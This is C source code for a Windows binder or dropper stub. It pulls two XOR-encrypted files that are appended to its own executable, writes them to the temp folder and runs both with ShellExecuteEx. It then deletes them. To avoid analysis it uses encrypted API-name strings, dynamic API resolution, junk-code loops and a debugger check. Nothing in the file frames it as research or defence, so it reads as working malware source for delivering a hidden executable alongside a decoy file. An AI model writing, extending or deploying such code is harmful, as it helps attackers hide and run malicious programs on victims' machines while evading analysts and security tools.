#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Obfuscation constants
#define XOR_KEY 0xAB
#define MAGIC_XOR_KEY 0x7F
#define JUNK_ITERATIONS 500
#define ANTI_DEBUG_CHECKS 3


static unsigned char enc_magic[] = {0xF4, 0x8A, 0x91, 0x9B, 0x8A, 0xE1, 0xEE, 0xF6};


static unsigned char enc_kernel32[] = {0xE0, 0xC8, 0xF1, 0xC9, 0xC8, 0xCF, 0xF6, 0xF7, 0xC1, 0xC6, 0xCF, 0xCF};
static unsigned char enc_shell32[] = {0xF8, 0xC1, 0xC8, 0xCF, 0xCF, 0xF6, 0xF7, 0xC1, 0xC6, 0xCF, 0xCF};
static unsigned char enc_GetProcAddress[] = {0xFC, 0xC8, 0xF9, 0xEB, 0xF1, 0xC4, 0xC2, 0xFC, 0xC6, 0xC6, 0xF1, 0xC8, 0xF8, 0xF8};
static unsigned char enc_LoadLibraryA[] = {0xFD, 0xC4, 0xC2, 0xC6, 0xFD, 0xC0, 0xC3, 0xF1, 0xC2, 0xF1, 0xFE, 0xFC};
static unsigned char enc_GetModuleFileName[] = {0xFC, 0xC8, 0xF9, 0xF4, 0xC4, 0xC6, 0xFA, 0xCF, 0xC8, 0xFE, 0xC0, 0xCF, 0xC8, 0xF9, 0xC2, 0xF0, 0xC8};
static unsigned char enc_GetTempPath[] = {0xFC, 0xC8, 0xF9, 0xF9, 0xC8, 0xF0, 0xF5, 0xEB, 0xC2, 0xF9, 0xC1};
static unsigned char enc_ShellExecuteEx[] = {0xF8, 0xC1, 0xC8, 0xCF, 0xCF, 0xF4, 0xEE, 0xC8, 0xC2, 0xFA, 0xF9, 0xC8, 0xF4, 0xEE};

// Function pointer types
typedef HMODULE (WINAPI *pfnLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *pfnGetProcAddress)(HMODULE, LPCSTR);
typedef DWORD (WINAPI *pfnGetModuleFileNameA)(HMODULE, LPSTR, DWORD);
typedef DWORD (WINAPI *pfnGetTempPathA)(DWORD, LPSTR);
typedef BOOL (WINAPI *pfnShellExecuteExA)(LPSHELLEXECUTEINFOA);
typedef HANDLE (WINAPI *pfnCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef DWORD (WINAPI *pfnGetFileSize)(HANDLE, LPDWORD);
typedef BOOL (WINAPI *pfnReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *pfnWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *pfnCloseHandle)(HANDLE);
typedef DWORD (WINAPI *pfnSetFilePointer)(HANDLE, LONG, PLONG, DWORD);
typedef VOID (WINAPI *pfnSleep)(DWORD);
typedef BOOL (WINAPI *pfnDeleteFileA)(LPCSTR);
typedef DWORD (WINAPI *pfnWaitForSingleObject)(HANDLE, DWORD);


static pfnLoadLibraryA g_LoadLibraryA = NULL;
static pfnGetProcAddress g_GetProcAddress = NULL;
static pfnGetModuleFileNameA g_GetModuleFileNameA = NULL;
static pfnGetTempPathA g_GetTempPathA = NULL;
static pfnShellExecuteExA g_ShellExecuteExA = NULL;
static pfnCreateFileA g_CreateFileA = NULL;
static pfnGetFileSize g_GetFileSize = NULL;
static pfnReadFile g_ReadFile = NULL;
static pfnWriteFile g_WriteFile = NULL;
static pfnCloseHandle g_CloseHandle = NULL;
static pfnSetFilePointer g_SetFilePointer = NULL;
static pfnSleep g_Sleep = NULL;
static pfnDeleteFileA g_DeleteFileA = NULL;
static pfnWaitForSingleObject g_WaitForSingleObject = NULL;


static void junk_code(void) {
    volatile unsigned int dummy = 0;
    volatile unsigned int seed = GetTickCount();
    for (int i = 0; i < JUNK_ITERATIONS; i++) {
        dummy ^= ((unsigned int)i * 0x1234) + seed;
        dummy = (dummy << 3) ^ (dummy >> 5);
        dummy += (seed ^ i) & 0xFFFF;
        seed = (seed * 1103515245 + 12345) & 0x7FFFFFFF; 
    }
}

static int check_debugger(void) {
 
    if (IsDebuggerPresent()) return 1;
    
    // Skip other checks for now to ensure compatibility
    return 0;
}

static void decrypt_string(unsigned char* encrypted, char* output, int len) {
    for (int i = 0; i < len; i++) {
        output[i] = encrypted[i] ^ XOR_KEY;
    }
    output[len] = 0;
}

static void obfuscated_delay(int ms) {
    volatile int calc = 0;
    DWORD start = GetTickCount();
    while ((GetTickCount() - start) < (DWORD)ms) {
        calc += GetTickCount() & 0xFF;
        calc ^= (calc << 1);
    }
}

static int resolve_apis(void) {

    HMODULE hKernel32 = GetModuleHandleA(NULL);
    hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) return 0;
    

    g_LoadLibraryA = (pfnLoadLibraryA)GetProcAddress(hKernel32, "LoadLibraryA");
    g_GetProcAddress = (pfnGetProcAddress)GetProcAddress(hKernel32, "GetProcAddress");
    
    if (!g_LoadLibraryA || !g_GetProcAddress) return 0;
    
   
    char api_name[64];
    
    decrypt_string(enc_GetModuleFileName, api_name, sizeof(enc_GetModuleFileName) - 1);
    g_GetModuleFileNameA = (pfnGetModuleFileNameA)g_GetProcAddress(hKernel32, api_name);
    
    decrypt_string(enc_GetTempPath, api_name, sizeof(enc_GetTempPath) - 1);
    g_GetTempPathA = (pfnGetTempPathA)g_GetProcAddress(hKernel32, api_name);
    
    g_CreateFileA = (pfnCreateFileA)g_GetProcAddress(hKernel32, "CreateFileA");
    g_GetFileSize = (pfnGetFileSize)g_GetProcAddress(hKernel32, "GetFileSize");
    g_ReadFile = (pfnReadFile)g_GetProcAddress(hKernel32, "ReadFile");
    g_WriteFile = (pfnWriteFile)g_GetProcAddress(hKernel32, "WriteFile");
    g_CloseHandle = (pfnCloseHandle)g_GetProcAddress(hKernel32, "CloseHandle");
    g_SetFilePointer = (pfnSetFilePointer)g_GetProcAddress(hKernel32, "SetFilePointer");
    g_Sleep = (pfnSleep)g_GetProcAddress(hKernel32, "Sleep");
    g_DeleteFileA = (pfnDeleteFileA)g_GetProcAddress(hKernel32, "DeleteFileA");
    g_WaitForSingleObject = (pfnWaitForSingleObject)g_GetProcAddress(hKernel32, "WaitForSingleObject");
    

    char shell32_name[32];
    decrypt_string(enc_shell32, shell32_name, sizeof(enc_shell32) - 1);
    HMODULE hShell32 = g_LoadLibraryA(shell32_name);
    if (!hShell32) return 0;
    
    decrypt_string(enc_ShellExecuteEx, api_name, sizeof(enc_ShellExecuteEx) - 1);
    g_ShellExecuteExA = (pfnShellExecuteExA)g_GetProcAddress(hShell32, api_name);
    
    return 1;
}

static void decrypt_data(unsigned char* data, int size, unsigned char key) {
    for (int i = 0; i < size; i++) {
        data[i] ^= key ^ (i & 0xFF);
    }
}

static void get_executable_path(char* path, int max_size) {
    if (g_GetModuleFileNameA) {
        g_GetModuleFileNameA(NULL, path, max_size);
    }
}

static void get_temp_filename(const char* extension, char* temp_path, int max_size) {
    char temp_dir[512];
    char temp_name[512];
    
    if (g_GetTempPathA) {
        g_GetTempPathA(sizeof(temp_dir), temp_dir);
    }
    

    DWORD tick = GetTickCount();
    sprintf(temp_name, "%s\\BND_%08X%s", temp_dir, tick, extension);
    strncpy(temp_path, temp_name, max_size);
}

static int secure_extract_and_execute(void) {
   
    if (check_debugger()) {
        
        obfuscated_delay(1000);
        return 0;
    }
    
    char exe_path[512];
    get_executable_path(exe_path, sizeof(exe_path));
    

    HANDLE hFile = g_CreateFileA(exe_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
       
        MessageBoxA(NULL, "Failed to open executable", "Error", MB_OK);
        return 1;
    }
    
    DWORD file_size = g_GetFileSize(hFile, NULL);
    if (file_size == INVALID_FILE_SIZE) {
        g_CloseHandle(hFile);
        return 1;
    }
    

    g_SetFilePointer(hFile, file_size - 8, NULL, FILE_BEGIN);
    unsigned char magic[8];
    DWORD bytes_read;
    g_ReadFile(hFile, magic, 8, &bytes_read, NULL);
    

    for (int i = 0; i < 8; i++) {
        magic[i] ^= MAGIC_XOR_KEY;
    }
    
   
    char decrypted_magic[9];
    decrypt_string(enc_magic, decrypted_magic, 8);
    
    int magic_match = 1;
    for (int i = 0; i < 8; i++) {
        if (magic[i] != decrypted_magic[i]) {
            magic_match = 0;
            break;
        }
    }
    
    if (!magic_match) {
        g_CloseHandle(hFile);
        return 0; // 
    }
    
    junk_code(); 
    
 
     g_SetFilePointer(hFile, file_size - 16, NULL, FILE_BEGIN);
     unsigned int file1_size, file2_size;
     g_ReadFile(hFile, &file1_size, 4, &bytes_read, NULL);
     g_ReadFile(hFile, &file2_size, 4, &bytes_read, NULL);
    
  
    file1_size ^= 0x12345678;
    file2_size ^= 0x87654321;
    
    
    long file1_start = file_size - 16 - file2_size - file1_size;
    long file2_start = file_size - 16 - file2_size;
    
   
    g_SetFilePointer(hFile, file1_start, NULL, FILE_BEGIN);
    unsigned char* file1_data = (unsigned char*)malloc(file1_size);
    g_ReadFile(hFile, file1_data, file1_size, &bytes_read, NULL);
    
   
    decrypt_data(file1_data, file1_size, 0x42);
    
    char temp_file1[512];
    get_temp_filename(".exe", temp_file1, sizeof(temp_file1));
    
    HANDLE hTemp1 = g_CreateFileA(temp_file1, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (hTemp1 != INVALID_HANDLE_VALUE) {
        DWORD written;
        g_WriteFile(hTemp1, file1_data, file1_size, &written, NULL);
        g_CloseHandle(hTemp1);
    }
    free(file1_data);
    
 
    g_SetFilePointer(hFile, file2_start, NULL, FILE_BEGIN);
    unsigned char* file2_data = (unsigned char*)malloc(file2_size);
    g_ReadFile(hFile, file2_data, file2_size, &bytes_read, NULL);
    
   
    decrypt_data(file2_data, file2_size, 0x24);
    
    char temp_file2[512];
    get_temp_filename(".tmp", temp_file2, sizeof(temp_file2));
    
    HANDLE hTemp2 = g_CreateFileA(temp_file2, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (hTemp2 != INVALID_HANDLE_VALUE) {
        DWORD written;
        g_WriteFile(hTemp2, file2_data, file2_size, &written, NULL);
        g_CloseHandle(hTemp2);
    }
    free(file2_data);
    
    g_CloseHandle(hFile);
    
    junk_code(); 
    

    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize = sizeof(sei);
    sei.fMask = 0x00000040; 
    sei.lpFile = temp_file1;
    sei.nShow = 1; // 
    
    if (g_ShellExecuteExA && g_ShellExecuteExA(&sei)) {
        if (sei.hProcess) {
            g_WaitForSingleObject(sei.hProcess, 0xFFFFFFFF); 
            g_CloseHandle(sei.hProcess);
        }
    }
    

    SHELLEXECUTEINFOA sei2 = {0};
    sei2.cbSize = sizeof(sei2);
    sei2.lpVerb = "open";
    sei2.lpFile = temp_file2;
    sei2.nShow = 1;
    if (g_ShellExecuteExA) g_ShellExecuteExA(&sei2);
    

    obfuscated_delay(2000);
    

    g_DeleteFileA(temp_file1);
    g_DeleteFileA(temp_file2);
    
    return 0;
}


static int simple_extract_and_execute(void) {
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, sizeof(exe_path));
    
    FILE* file = fopen(exe_path, "rb");
    if (!file) return 1;
    
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    

    fseek(file, file_size - 8, SEEK_SET);
    unsigned char magic[8];
    fread(magic, 1, 8, file);
    
   
    for (int i = 0; i < 8; i++) {
        magic[i] ^= MAGIC_XOR_KEY;
    }
    

    if (strncmp((char*)magic, "BENDER01", 8) != 0) {
        fclose(file);
        return 0; 
    }
    

    fseek(file, file_size - 16, SEEK_SET);
    unsigned int file1_size, file2_size;
    fread(&file1_size, 4, 1, file);
    fread(&file2_size, 4, 1, file);
    
    file1_size ^= 0x12345678;
    file2_size ^= 0x87654321;
    

    long file1_start = file_size - 16 - file2_size - file1_size;
    long file2_start = file_size - 16 - file2_size;
    

    fseek(file, file1_start, SEEK_SET);
    unsigned char* file1_data = malloc(file1_size);
    fread(file1_data, 1, file1_size, file);
    

    for (int i = 0; i < (int)file1_size; i++) {
        file1_data[i] ^= 0x42 ^ (i & 0xFF);
    }
    
    char temp1[MAX_PATH];
    GetTempPathA(MAX_PATH, temp1);
    sprintf(temp1 + strlen(temp1), "BND_%08X.exe", GetTickCount());
    
    FILE* out1 = fopen(temp1, "wb");
    if (out1) {
        fwrite(file1_data, 1, file1_size, out1);
        fclose(out1);
    }
    free(file1_data);
    

    fseek(file, file2_start, SEEK_SET);
    unsigned char* file2_data = malloc(file2_size);
    fread(file2_data, 1, file2_size, file);
    

    for (int i = 0; i < (int)file2_size; i++) {
        file2_data[i] ^= 0x24 ^ (i & 0xFF);
    }
    
    char temp2[MAX_PATH];
    GetTempPathA(MAX_PATH, temp2);
    sprintf(temp2 + strlen(temp2), "BND_%08X.tmp", GetTickCount() + 1);
    
    FILE* out2 = fopen(temp2, "wb");
    if (out2) {
        fwrite(file2_data, 1, file2_size, out2);
        fclose(out2);
    }
    free(file2_data);
    
    fclose(file);
    

    ShellExecuteA(NULL, NULL, temp1, NULL, NULL, SW_SHOWNORMAL);
    Sleep(1000);
    ShellExecuteA(NULL, "open", temp2, NULL, NULL, SW_SHOWNORMAL);
    Sleep(2000);
    
    // Cleanup
    DeleteFileA(temp1);
    DeleteFileA(temp2);
    
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    if (resolve_apis()) {
  
        if (!check_debugger()) {
            return secure_extract_and_execute();
        }
    }
    
  
    return simple_extract_and_execute();
}

int main() {
    return WinMain(GetModuleHandle(NULL), NULL, GetCommandLine(), SW_SHOWNORMAL);
} 